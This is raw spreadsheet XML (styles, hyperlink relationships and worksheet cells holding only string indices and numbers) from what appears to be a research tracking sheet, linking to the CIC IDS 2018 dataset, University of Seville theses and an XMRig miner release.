    <xf numFmtId="0" fontId="18" fillId="8" borderId="61" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="3" fontId="12" fillId="8" borderId="61" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="12" fillId="8" borderId="75"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60" fillId="7" borderId="42" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="8" borderId="76" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="75" fillId="8" borderId="76" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="3" fontId="12" fillId="8" borderId="76" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="12" fillId="8" borderId="77" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="34" fillId="0" borderId="0" xfId="1" applyFont="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="9" fillId="0" borderId="0" xfId="1" applyFont="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="9" fillId="0" borderId="78" xfId="1" applyFont="1" applyBorder="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="15" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="11" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="0" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="82" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="40" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="83" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="78" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="34" fillId="0" borderId="0" xfId="1" applyFont="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" xfId="1" applyFont="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="73" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="84" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="72" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="7" borderId="74" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="0" borderId="85"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28" fillId="0" borderId="51" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="34" fillId="0" borderId="51" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="51" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="9" fillId="0" borderId="51" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="51" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="51" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="52" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="9" fillId="0" borderId="86" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="0" borderId="54" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="28" fillId="0" borderId="54" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="34" fillId="0" borderId="54" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="54" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="54" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="54" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="55" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="54" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="32" borderId="86" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="32" borderId="54" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="32" borderId="54" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="12" fillId="32" borderId="54" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="32" borderId="55" xfId="1" applyFont="1" applyFill="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8" fillId="0" borderId="1" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="10" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="11" xfId="0" applyFont="1"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1" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="10" xfId="0" applyFont="1" applyBorder="1"/>
    <xf numFmtId="0" fontId="28" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="78" fillId="0" borderId="34" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="78" fillId="0" borderId="0" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="78" fillId="0" borderId="35" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="85" fillId="0" borderId="41" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="28" fillId="0" borderId="0" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="30" fillId="0" borderId="1" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertic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76" fillId="4" borderId="39" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="76" fillId="4" borderId="0" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="76" fillId="4" borderId="40" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="78" fillId="5" borderId="39" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="78" fillId="5" borderId="0" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="84" fillId="6" borderId="39" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="84" fillId="6" borderId="0" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="78" fillId="28" borderId="39" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="78" fillId="28" borderId="0" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="78" fillId="28" borderId="40" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="76" fillId="2" borderId="39" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="76" fillId="2" borderId="0" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="76" fillId="3" borderId="39" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="76" fillId="3" borderId="0" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" xfId="1" applyFont="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="35" fillId="17" borderId="0" xfId="1" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="34" fillId="29" borderId="39" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="34" fillId="29" borderId="0" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="34" fillId="29" borderId="40" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="30" borderId="39" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="30" borderId="0" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="30" borderId="40" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="31" borderId="79" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="31" borderId="80" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="31" borderId="81" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="16" borderId="79" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="16" borderId="80" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="16" borderId="81" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="35" fillId="6" borderId="39" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="35" fillId="6" borderId="0" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="40" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="center" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="61" fillId="23" borderId="28" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="36" fillId="0" borderId="33" xfId="0" applyFont="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colors>
    <mruColors>
      <color rgb="FFFFFFCC"/>
      <color rgb="FFAFE3B1"/>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ip/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.unb.ca/cic/datasets/ids-2018.html" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz"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hyperlink" Target="https://biblus.us.es/bibing/proyectos/abreproy/94340/fichero/TFG-4340+GARC%C3%8DA+CORONADO%2C+ANDR%C3%89S.pdf" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://idus.us.es/handle/11441/143609" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://idus.us.es/items/88bc3f70-881a-4b0a-982e-3d60d0a07d65" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.unb.ca/cic/datasets/ids-2018.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outlinePr summaryBelow="0" summaryRight="0"/>
  </sheetPr>
  <dimension ref="C4:Q25"/>
  <sheetViews>
    <sheetView topLeftCell="C1" zoomScale="70" zoomScaleNormal="70" workbookViewId="0">
      <selection activeCell="I9" sqref="I9"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultColWidth="12.5703125" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col min="3" max="3" width="28.42578125" customWidth="1"/>
    <col min="4" max="4" width="69.28515625" customWidth="1"/>
    <col min="5" max="5" width="27.5703125" customWidth="1"/>
    <col min="6" max="6" width="21.42578125" customWidth="1"/>
    <col min="7" max="7" width="24.28515625" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="4" spans="3:17" ht="12.75">
      <c r="C4" s="441" t="s">
        <v>0</v>
      </c>
      <c r="D4" s="442"/>
      <c r="E4" s="442"/>
      <c r="F4" s="442"/>
      <c r="G4" s="442"/>
      <c r="H4" s="442"/>
      <c r="I4" s="442"/>
      <c r="J4" s="442"/>
      <c r="K4" s="443"/>
    </row>
    <row r="5" spans="3:17" ht="12.75">
      <c r="C5" s="444"/>
      <c r="D5" s="445"/>
      <c r="E5" s="445"/>
      <c r="F5" s="445"/>
      <c r="G5" s="445"/>
      <c r="H5" s="445"/>
      <c r="I5" s="445"/>
      <c r="J5" s="445"/>
      <c r="K5" s="446"/>
    </row>
    <row r="7" spans="3:17" ht="19.5" customHeight="1">
      <c r="C7" s="1" t="s">
        <v>1</v>
      </c>
      <c r="D7" s="2" t="s">
        <v>2</v>
      </c>
      <c r="E7" s="2" t="s">
        <v>3</v>
      </c>
      <c r="F7" s="2" t="s">
        <v>4</v>
      </c>
      <c r="G7" s="2" t="s">
        <v>5</v>
      </c>
      <c r="H7" s="2" t="s">
        <v>6</v>
      </c>
      <c r="I7" s="2" t="s">
        <v>7</v>
      </c>
      <c r="J7" s="2" t="s">
        <v>8</v>
      </c>
      <c r="K7" s="3" t="s">
        <v>9</v>
      </c>
      <c r="L7" s="4"/>
      <c r="M7" s="4"/>
      <c r="N7" s="4"/>
      <c r="O7" s="4"/>
      <c r="P7" s="4"/>
      <c r="Q7" s="4"/>
    </row>
    <row r="8" spans="3:17" ht="51.75" customHeight="1">
      <c r="C8" s="5" t="s">
        <v>10</v>
      </c>
      <c r="D8" s="6" t="s">
        <v>11</v>
      </c>
      <c r="E8" s="6">
        <v>4022</v>
      </c>
      <c r="F8" s="7" t="s">
        <v>12</v>
      </c>
      <c r="G8" s="8">
        <v>45442</v>
      </c>
      <c r="H8" s="9" t="s">
        <v>13</v>
      </c>
      <c r="I8" s="10" t="s">
        <v>13</v>
      </c>
      <c r="J8" s="11" t="s">
        <v>13</v>
      </c>
      <c r="K8" s="12" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="9" spans="3:17" ht="51.75" customHeight="1">
      <c r="C9" s="13" t="s">
        <v>14</v>
      </c>
      <c r="D9" s="14" t="s">
        <v>2793</v>
      </c>
      <c r="E9" s="14">
        <v>45551</v>
      </c>
      <c r="F9" s="15" t="s">
        <v>12</v>
      </c>
      <c r="G9" s="16">
        <v>45442</v>
      </c>
      <c r="H9" s="17"/>
      <c r="I9" s="167"/>
      <c r="J9" s="18" t="s">
        <v>13</v>
      </c>
      <c r="K9" s="19" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="10" spans="3:17" ht="51.75" customHeight="1">
      <c r="C10" s="13" t="s">
        <v>15</v>
      </c>
      <c r="D10" s="14" t="s">
        <v>16</v>
      </c>
      <c r="E10" s="14">
        <v>35763</v>
      </c>
      <c r="F10" s="15">
        <v>10605</v>
      </c>
      <c r="G10" s="16">
        <v>45441</v>
      </c>
      <c r="H10" s="17"/>
      <c r="I10" s="20" t="s">
        <v>13</v>
      </c>
      <c r="J10" s="18" t="s">
        <v>13</v>
      </c>
      <c r="K10" s="19" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="11" spans="3:17" ht="51.75" customHeight="1">
      <c r="C11" s="21" t="s">
        <v>17</v>
      </c>
      <c r="D11" s="61" t="s">
        <v>2794</v>
      </c>
      <c r="E11" s="22">
        <v>47830</v>
      </c>
      <c r="F11" s="22" t="s">
        <v>12</v>
      </c>
      <c r="G11" s="23">
        <v>45441</v>
      </c>
      <c r="H11" s="24"/>
      <c r="I11" s="25"/>
      <c r="J11" s="26"/>
      <c r="K11" s="27" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="12" spans="3:17" ht="21.75" customHeight="1"/>
    <row r="13" spans="3:17" ht="12.75">
      <c r="C13" s="28"/>
      <c r="D13" s="28"/>
      <c r="E13" s="28"/>
      <c r="F13" s="28"/>
      <c r="G13" s="28"/>
      <c r="H13" s="28"/>
      <c r="I13" s="28"/>
    </row>
    <row r="14" spans="3:17" ht="12.75">
      <c r="C14" s="441" t="s">
        <v>18</v>
      </c>
      <c r="D14" s="442"/>
      <c r="E14" s="442"/>
      <c r="F14" s="442"/>
      <c r="G14" s="442"/>
      <c r="H14" s="442"/>
      <c r="I14" s="442"/>
      <c r="J14" s="442"/>
      <c r="K14" s="443"/>
    </row>
    <row r="15" spans="3:17" ht="12.75">
      <c r="C15" s="444"/>
      <c r="D15" s="445"/>
      <c r="E15" s="445"/>
      <c r="F15" s="445"/>
      <c r="G15" s="445"/>
      <c r="H15" s="445"/>
      <c r="I15" s="445"/>
      <c r="J15" s="445"/>
      <c r="K15" s="446"/>
    </row>
    <row r="17" spans="3:11" ht="15">
      <c r="C17" s="1" t="s">
        <v>19</v>
      </c>
      <c r="D17" s="2" t="s">
        <v>2</v>
      </c>
      <c r="E17" s="2" t="s">
        <v>3</v>
      </c>
      <c r="F17" s="2" t="s">
        <v>20</v>
      </c>
      <c r="G17" s="2" t="s">
        <v>21</v>
      </c>
      <c r="H17" s="2" t="s">
        <v>5</v>
      </c>
      <c r="I17" s="3" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="18" spans="3:11" ht="44.25" customHeight="1">
      <c r="C18" s="29" t="s">
        <v>23</v>
      </c>
      <c r="D18" s="30" t="s">
        <v>24</v>
      </c>
      <c r="E18" s="30">
        <v>11881</v>
      </c>
      <c r="F18" s="31" t="s">
        <v>25</v>
      </c>
      <c r="G18" s="22" t="s">
        <v>26</v>
      </c>
      <c r="H18" s="23">
        <v>45477</v>
      </c>
      <c r="I18" s="32" t="s">
        <v>27</v>
      </c>
      <c r="J18" s="4"/>
      <c r="K18" s="33"/>
    </row>
    <row r="20" spans="3:11" ht="12.75">
      <c r="H20" s="34" t="s">
        <v>28</v>
      </c>
    </row>
    <row r="21" spans="3:11" ht="12.75">
      <c r="C21" s="441" t="s">
        <v>29</v>
      </c>
      <c r="D21" s="442"/>
      <c r="E21" s="442"/>
      <c r="F21" s="442"/>
      <c r="G21" s="442"/>
      <c r="H21" s="442"/>
      <c r="I21" s="442"/>
      <c r="J21" s="442"/>
      <c r="K21" s="443"/>
    </row>
    <row r="22" spans="3:11" ht="12.75">
      <c r="C22" s="444"/>
      <c r="D22" s="445"/>
      <c r="E22" s="445"/>
      <c r="F22" s="445"/>
      <c r="G22" s="445"/>
      <c r="H22" s="445"/>
      <c r="I22" s="445"/>
      <c r="J22" s="445"/>
      <c r="K22" s="446"/>
    </row>
    <row r="24" spans="3:11" ht="15">
      <c r="C24" s="1" t="s">
        <v>19</v>
      </c>
      <c r="D24" s="2" t="s">
        <v>2</v>
      </c>
      <c r="E24" s="2" t="s">
        <v>3</v>
      </c>
      <c r="F24" s="2" t="s">
        <v>20</v>
      </c>
      <c r="G24" s="2" t="s">
        <v>21</v>
      </c>
      <c r="H24" s="2" t="s">
        <v>5</v>
      </c>
      <c r="I24" s="3" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="25" spans="3:11" ht="25.5">
      <c r="C25" s="29" t="s">
        <v>30</v>
      </c>
      <c r="D25" s="30" t="s">
        <v>31</v>
      </c>
      <c r="E25" s="30">
        <v>21061</v>
      </c>
      <c r="F25" s="31" t="s">
        <v>32</v>
      </c>
      <c r="G25" s="31" t="s">
        <v>32</v>
      </c>
      <c r="H25" s="23">
        <v>45477</v>
      </c>
      <c r="I25" s="32"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="C4:K5"/>
    <mergeCell ref="C14:K15"/>
    <mergeCell ref="C21:K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outlinePr summaryBelow="0" summaryRight="0"/>
  </sheetPr>
  <dimension ref="C3:K46"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultColWidth="12.5703125" defaultRowHeight="15.75" customHeight="1"/>
  <sheetData>
    <row r="3" spans="3:11">
      <c r="C3" s="441" t="s">
        <v>18</v>
      </c>
      <c r="D3" s="442"/>
      <c r="E3" s="442"/>
      <c r="F3" s="442"/>
      <c r="G3" s="442"/>
      <c r="H3" s="442"/>
      <c r="I3" s="442"/>
      <c r="J3" s="442"/>
      <c r="K3" s="443"/>
    </row>
    <row r="4" spans="3:11">
      <c r="C4" s="444"/>
      <c r="D4" s="445"/>
      <c r="E4" s="445"/>
      <c r="F4" s="445"/>
      <c r="G4" s="445"/>
      <c r="H4" s="445"/>
      <c r="I4" s="445"/>
      <c r="J4" s="445"/>
      <c r="K4" s="446"/>
    </row>
    <row r="6" spans="3:11">
      <c r="C6" s="447" t="s">
        <v>33</v>
      </c>
      <c r="D6" s="442"/>
      <c r="E6" s="442"/>
      <c r="F6" s="442"/>
      <c r="G6" s="442"/>
      <c r="H6" s="442"/>
      <c r="I6" s="442"/>
      <c r="J6" s="442"/>
      <c r="K6" s="443"/>
    </row>
    <row r="7" spans="3:11">
      <c r="C7" s="448" t="s">
        <v>34</v>
      </c>
      <c r="D7" s="449"/>
      <c r="E7" s="449"/>
      <c r="F7" s="450" t="s">
        <v>35</v>
      </c>
      <c r="G7" s="449"/>
      <c r="H7" s="449"/>
      <c r="I7" s="450" t="s">
        <v>36</v>
      </c>
      <c r="J7" s="449"/>
      <c r="K7" s="451"/>
    </row>
    <row r="8" spans="3:11">
      <c r="C8" s="452">
        <v>10</v>
      </c>
      <c r="D8" s="445"/>
      <c r="E8" s="445"/>
      <c r="F8" s="453">
        <v>30</v>
      </c>
      <c r="G8" s="445"/>
      <c r="H8" s="445"/>
      <c r="I8" s="453" t="s">
        <v>37</v>
      </c>
      <c r="J8" s="445"/>
      <c r="K8" s="446"/>
    </row>
    <row r="11" spans="3:11">
      <c r="C11" s="447" t="s">
        <v>38</v>
      </c>
      <c r="D11" s="442"/>
      <c r="E11" s="442"/>
      <c r="F11" s="442"/>
      <c r="G11" s="442"/>
      <c r="H11" s="442"/>
      <c r="I11" s="442"/>
      <c r="J11" s="442"/>
      <c r="K11" s="443"/>
    </row>
    <row r="12" spans="3:11">
      <c r="C12" s="448" t="s">
        <v>39</v>
      </c>
      <c r="D12" s="449"/>
      <c r="E12" s="449"/>
      <c r="F12" s="449"/>
      <c r="G12" s="449"/>
      <c r="H12" s="449"/>
      <c r="I12" s="449"/>
      <c r="J12" s="449"/>
      <c r="K12" s="451"/>
    </row>
    <row r="13" spans="3:11">
      <c r="C13" s="448" t="s">
        <v>40</v>
      </c>
      <c r="D13" s="449"/>
      <c r="E13" s="449"/>
      <c r="F13" s="449"/>
      <c r="G13" s="450" t="s">
        <v>34</v>
      </c>
      <c r="H13" s="449"/>
      <c r="I13" s="449"/>
      <c r="J13" s="449"/>
      <c r="K13" s="451"/>
    </row>
    <row r="14" spans="3:11">
      <c r="C14" s="448" t="s">
        <v>41</v>
      </c>
      <c r="D14" s="449"/>
      <c r="E14" s="449"/>
      <c r="F14" s="449"/>
      <c r="G14" s="450">
        <v>5000</v>
      </c>
      <c r="H14" s="449"/>
      <c r="I14" s="449"/>
      <c r="J14" s="449"/>
      <c r="K14" s="451"/>
    </row>
    <row r="15" spans="3:11">
      <c r="C15" s="448" t="s">
        <v>42</v>
      </c>
      <c r="D15" s="449"/>
      <c r="E15" s="449"/>
      <c r="F15" s="449"/>
      <c r="G15" s="450">
        <v>5000</v>
      </c>
      <c r="H15" s="449"/>
      <c r="I15" s="449"/>
      <c r="J15" s="449"/>
      <c r="K15" s="451"/>
    </row>
    <row r="16" spans="3:11">
      <c r="C16" s="448" t="s">
        <v>43</v>
      </c>
      <c r="D16" s="449"/>
      <c r="E16" s="449"/>
      <c r="F16" s="449"/>
      <c r="G16" s="449"/>
